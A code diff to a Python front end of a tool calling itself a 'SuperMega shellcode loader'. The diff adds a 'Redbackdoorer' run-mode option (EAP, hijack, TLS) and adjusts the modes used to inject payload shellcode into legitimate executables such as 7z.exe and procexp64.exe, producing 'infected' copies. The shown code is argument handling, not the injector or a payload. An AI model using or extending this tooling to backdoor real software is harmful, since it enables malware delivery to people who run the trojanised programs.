@@ -61,6 +61,7 @@ def main():
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
     parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
     parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
+    parser.add_argument('--rbrunmode', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack, 3 tls)')
     parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
     parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
     parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
@@ -82,22 +83,22 @@ def main():
 
         if args.verify == "peb":
             project.inject = True
-            project.inject_mode = "1,1"
+            project.inject_mode = "1,2"
             project.inject_exe_in = "exes/7z.exe"
             project.inject_exe_out = "out/7z-verify.exe"
         elif args.verify == "iat":
             project.inject = True
-            project.inject_mode = "1,1"
+            project.inject_mode = "1,2"
             project.inject_exe_in = "exes/procexp64.exe"
             project.inject_exe_out = "out/procexp64-verify.exe"
         elif args.verify == "rwx":
             project.inject = True
-            project.inject_mode = "1,1"
+            project.inject_mode = "1,1"  # ,2 is broken atm
             project.inject_exe_in = "exes/wifiinfoview.exe"
             project.inject_exe_out = "out/wifiinfoview.exe-verify.exe"
-
         else:
             logger.info("Unknown verify option {}, use std/iat".format(args.verify))
+            return
 
     else:
         project.try_start_final_infected_exe = args.start_injected
@@ -106,6 +107,15 @@ def main():
 
         project.cleanup_files_on_start = not args.no_clean_at_start
         project.cleanup_files_on_exit =not args.no_clean_at_exit
+
+        if args.rbrunmode:
+            if args.rbrunmode == "1" or args.rbrunmode == "2" or args.rbrunmode == "3":
+                project.inject_mode = "1," + args.rbrunmode
+            else:
+                logging.error("Invalid mode, use one of:")
+                for i in ["1", "2", "3"]:
+                    logging.error("  {}  {}".format(i, rbrunmode_str(i)))
+                return
 
         if not args.shellcode or not args.inject:
             logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
